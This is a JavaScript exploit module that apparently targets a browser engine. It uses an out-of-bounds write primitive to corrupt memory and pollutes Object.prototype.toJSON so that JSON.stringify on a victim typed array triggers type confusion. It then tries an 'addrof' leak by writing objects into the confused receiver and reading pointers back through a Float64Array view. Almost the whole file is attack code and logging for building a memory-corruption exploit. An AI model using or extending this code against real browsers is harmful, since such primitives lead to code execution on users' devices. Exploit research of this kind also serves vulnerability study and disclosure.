// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v4_IsolateConfusedThisWrites)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V4_ISOLATE_CTW = "OriginalHeisenbug_TypedArrayAddrof_v4_IsolateCTW";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;

let last_probe_call_details_v4ictw = null; // ictw for IsolateConfusedThisWrites
let object_to_leak_A_v4ictw = null;
let object_to_leak_B_v4ictw = null;
let victim_typed_array_ref_v4ictw = null;

function toJSON_TA_Probe_IsolateConfusedThisWrites() {
    // Detalhes para ESTA chamada específica.
    let current_call_details = {
        probe_variant: "TA_Probe_Addrof_v4_IsolateCTW",
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        probe_called: true,
        this_was_victim_ref: (this === victim_typed_array_ref_v4ictw), // Registra se 'this' é a vítima nesta chamada
        writes_attempted_on_this: false
    };

    try {
        current_call_details.this_type_in_toJSON = Object.prototype.toString.call(this);
        logS3(`[${current_call_details.probe_variant}] Sonda INVOCADA. 'this' type: ${current_call_details.this_type_in_toJSON}. 'this' === victim_typed_array_ref_v4ictw? ${current_call_details.this_was_victim_ref}`, "leak");

        if (current_call_details.this_type_in_toJSON === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] TYPE CONFUSION DETECTED for 'this' (now [object Object])!`, "vuln");
            logS3(`[${current_call_details.probe_variant}] At this point of confusion, 'this' === victim_typed_array_ref_v4ictw? ${current_call_details.this_was_victim_ref}`, "info");

            // Se o 'this' confuso NÃO é a nossa vítima original, ainda tentamos escrever nele para ver o que acontece.
            // Se for a vítima original e estiver confusa, melhor ainda.
            logS3(`[${current_call_details.probe_variant}] Attempting addrof writes on the confused 'this' ([object Object])...`, "warn");
            if (object_to_leak_A_v4ictw) {
                this[0] = object_to_leak_A_v4ictw; // Modifica o 'this' desta chamada
                logS3(`[${current_call_details.probe_variant}] Wrote object_to_leak_A_v4ictw to this[0].`, "info");
            }
            if (object_to_leak_B_v4ictw) {
                this[1] = object_to_leak_B_v4ictw; // Modifica o 'this' desta chamada
                logS3(`[${current_call_details.probe_variant}] Wrote object_to_leak_B_v4ictw to this[1].`, "info");
            }
            current_call_details.writes_attempted_on_this = true;
        }
        // Não fazemos mais nada se this_type_in_toJSON não for '[object Object]' no momento.
        // A primeira chamada (onde this é Uint8Array) apenas passará.

        // Atualiza o registrador global APENAS se esta chamada for a que detectou a confusão,
        // OU se nenhuma confusão foi detectada ainda e esta é a primeira chamada (this é a vítima).
        // O objetivo é que last_probe_call_details_v4ictw reflita a chamada MAIS INTERESSANTE.
        if (current_call_details.this_type_in_toJSON === '[object Object]') {
            last_probe_call_details_v4ictw = { ...current_call_details };
        } else if (this === victim_typed_array_ref_v4ictw && !last_probe_call_details_v4ictw) {
            // Se é a primeira chamada e 'this' é a vítima, registra isso.
            last_probe_call_details_v4ictw = { ...current_call_details };
        }


    } catch (e) {
        current_call_details.error_in_toJSON = `${e.name}: ${e.message}`;
        logS3(`[${current_call_details.probe_variant}] ERROR in probe: ${e.name} - ${e.message}`, "error");
        // Mesmo em erro, atualiza o global com o que foi coletado.
        last_probe_call_details_v4ictw = { ...current_call_details };
    }
    
    // Log do estado final de current_call_details para esta invocação específica.
    logS3(`[${current_call_details.probe_variant}] Probe FINISHING. Local current_call_details: ${JSON.stringify(current_call_details)}`, "dev_verbose");

    // Retorna um objeto NOVO e SIMPLES para JSON.stringify.
    return { minimal_probe_v4ictw_did_execute: true }; 
}

export async function executeTypedArrayVictimAddrofTest_IsolateConfusedThisWrites() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_ISOLATE_CTW}.triggerAndAddrof`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (TypedArray, IsolateCTW) & Addrof Attempt ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_ISOLATE_CTW} Init...`;

    last_probe_call_details_v4ictw = null;
    victim_typed_array_ref_v4ictw = null;
    object_to_leak_A_v4ictw = { marker: "ObjA_TA_v4ictw", id: Date.now() }; 
    object_to_leak_B_v4ictw = { marker: "ObjB_TA_v4ictw", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput = null;
    let captured_probe_details_final = null; // Renomeado para clareza
    
    let addrof_result_A = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof A @ view[0]: Not attempted or Heisenbug/write failed." };
    let addrof_result_B = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof B @ view[1]: Not attempted or Heisenbug/write failed." };
    
    const fillPattern = 0.12121212121212;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        // ... (OOB init e write OOB são os mesmos)
        if (!oob_array_buffer_real && typeof oob_write_absolute !== 'function') {
            throw new Error("OOB Init failed or oob_write_absolute not available.");
        }
        logS3("OOB Environment initialized.", "info", FNAME_CURRENT_TEST);
        logS3(`   OOB corruption target in oob_array_buffer_real: ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}`, "info", FNAME_CURRENT_TEST);

        logS3(`STEP 1: Writing CRITICAL value ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE)} to oob_array_buffer_real[${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(100);


        victim_typed_array_ref_v4ictw = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
        let float64_view_on_underlying_ab = new Float64Array(victim_typed_array_ref_v4ictw.buffer);
        
        for(let i = 0; i < float64_view_on_underlying_ab.length; i++) {
            float64_view_on_underlying_ab[i] = fillPattern + i;
        }

        logS3(`STEP 2: victim_typed_array_ref_v4ictw (Uint8Array on buffer size ${VICTIM_BUFFER_SIZE}) created. View filled with ${float64_view_on_underlying_ab[0]}.`, "test", FNAME_CURRENT_TEST);
        logS3(`   Attempting JSON.stringify on victim_typed_array_ref_v4ictw with ${toJSON_TA_Probe_IsolateConfusedThisWrites.name}...`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_TA_Probe_IsolateConfusedThisWrites,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} polluted with ${toJSON_TA_Probe_IsolateConfusedThisWrites.name}.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Calling JSON.stringify(victim_typed_array_ref_v4ictw)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_typed_array_ref_v4ictw); 
            
            logS3(`  JSON.stringify(victim_typed_array_ref_v4ictw) completed. Stringify Output: ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            
            // Captura o estado da variável global 'last_probe_call_details_v4ictw'
            // Esta variável deve refletir a chamada da sonda mais "interessante" (idealmente a confusa).
            if (last_probe_call_details_v4ictw) {
                captured_probe_details_final = { ...last_probe_call_details_v4ictw }; 
            }
            logS3(`  FINAL Captured Probe Details (from global var): ${captured_probe_details_final ? JSON.stringify(captured_probe_details_final) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugConfirmedByCapturedDetails = false;
            if (captured_probe_details_final && 
                captured_probe_details_final.probe_called &&
                captured_probe_details_final.this_type_in_toJSON === "[object Object]") {
                heisenbugConfirmedByCapturedDetails = true;
                logS3(`  HEISENBUG CONFIRMED (via FINAL captured details)! 'this' type in that probe call: ${captured_probe_details_final.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
                logS3(`    In that probe call, 'this' === victim_typed_array_ref_v4ictw? ${captured_probe_details_final.this_was_victim_ref}`, "info");
                logS3(`    In that probe call, addrof writes attempted? ${captured_probe_details_final.writes_attempted_on_this}`, "info");
            } else {
                let msg = "Heisenbug (TypedArray as [object Object]) NOT confirmed via FINAL captured probe details.";
                // ... (mensagens de erro como antes)
                logS3(`  ALERT: ${msg}`, "error", FNAME_CURRENT_TEST);
            }
                
            logS3("STEP 3: Checking float64_view_on_underlying_ab...", "warn", FNAME_CURRENT_TEST);
            // ... (lógica de verificação de addrof e mensagens de resultado como antes)
            const val_A_double = float64_view_on_underlying_ab[0];
            addrof_result_A.leaked_address_as_double = val_A_double;
            let temp_buf_A = new ArrayBuffer(8); new Float64Array(temp_buf_A)[0] = val_A_double;
            addrof_result_A.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_buf_A)[0], new Uint32Array(temp_buf_A)[1]);
            logS3(`  Value read from float64_view_on_underlying_ab[0] (for ObjA): ${val_A_double} (${addrof_result_A.leaked_address_as_int64.toString(true)})`, "leak", FNAME_CURRENT_TEST);

            if (val_A_double !== (fillPattern + 0) && val_A_double !== 0 &&
                (addrof_result_A.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_A.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                logS3("  !!!! POTENTIAL POINTER READ at view[0] (ObjA) !!!!", "vuln", FNAME_CURRENT_TEST);
                addrof_result_A.success = true;
                addrof_result_A.message = "Heisenbug (IsolateCTW) observed & view[0] read suggests a pointer for ObjA.";
            } else {
                addrof_result_A.message = "View[0] read does not look like a pointer for ObjA or buffer was unchanged.";
                if (heisenbugConfirmedByCapturedDetails) addrof_result_A.message = "Heisenbug observed, but " + addrof_result_A.message;
                if (val_A_double === (fillPattern + 0)) addrof_result_A.message += " (Value matches initial fillPattern)";
            }

            const val_B_double = float64_view_on_underlying_ab[1];
            addrof_result_B.leaked_address_as_double = val_B_double;
            let temp_buf_B = new ArrayBuffer(8); new Float64Array(temp_buf_B)[0] = val_B_double;
            addrof_result_B.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_buf_B)[0], new Uint32Array(temp_buf_B)[1]);
            logS3(`  Value read from float64_view_on_underlying_ab[1] (for ObjB): ${val_B_double} (${addrof_result_B.leaked_address_as_int64.toString(true)})`, "leak", FNAME_CURRENT_TEST);
            
            if (val_B_double !== (fillPattern + 1) && val_B_double !== 0 &&
                (addrof_result_B.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_B.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                logS3("  !!!! POTENTIAL POINTER READ at view[1] (ObjB) !!!!", "vuln", FNAME_CURRENT_TEST);
                addrof_result_B.success = true;
                addrof_result_B.message = "Heisenbug (IsolateCTW) observed & view[1] read suggests a pointer for ObjB.";
            } else {
                addrof_result_B.message = "View[1] read does not look like a pointer for ObjB or buffer was unchanged.";
                 if (heisenbugConfirmedByCapturedDetails) addrof_result_B.message = "Heisenbug observed, but " + addrof_result_B.message;
                if (val_B_double === (fillPattern + 1)) addrof_result_B.message += " (Value matches initial fillPattern)";
            }

            if (addrof_result_A.success || addrof_result_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_ISOLATE_CTW}: Addr? SUCESSO!`;
            } else if (heisenbugConfirmedByCapturedDetails) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_ISOLATE_CTW}: Heisenbug OK, Addr Falhou`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_ISOLATE_CTW}: Heisenbug Falhou?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`    CRITICAL ERROR during JSON.stringify or addrof logic: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_ISOLATE_CTW}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.${ppKey} restored.`, "info", FNAME_CURRENT_TEST);
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        // ... (erro geral)
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_ISOLATE_CTW} CRITICALLY FAILED`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        // ... (logs de resultado final)
        logS3(`Addrof A Result (view[0]): Success=${addrof_result_A.success}, Msg='${addrof_result_A.message}'`, addrof_result_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result_A.leaked_address_as_int64){
            logS3(`  Addrof A (Int64): ${addrof_result_A.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        logS3(`Addrof B Result (view[1]): Success=${addrof_result_B.success}, Msg='${addrof_result_B.message}'`, addrof_result_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result_B.leaked_address_as_int64){
            logS3(`  Addrof B (Int64): ${addrof_result_B.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        
        object_to_leak_A_v4ictw = null;
        object_to_leak_B_v4ictw = null;
        victim_typed_array_ref_v4ictw = null;
        last_probe_call_details_v4ictw = null; 
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, 
        stringifyResult: stringifyOutput, 
        toJSON_details: captured_probe_details_final, 
        addrof_A_attempt_result: addrof_result_A,
        addrof_B_attempt_result: addrof_result_B
    };
}
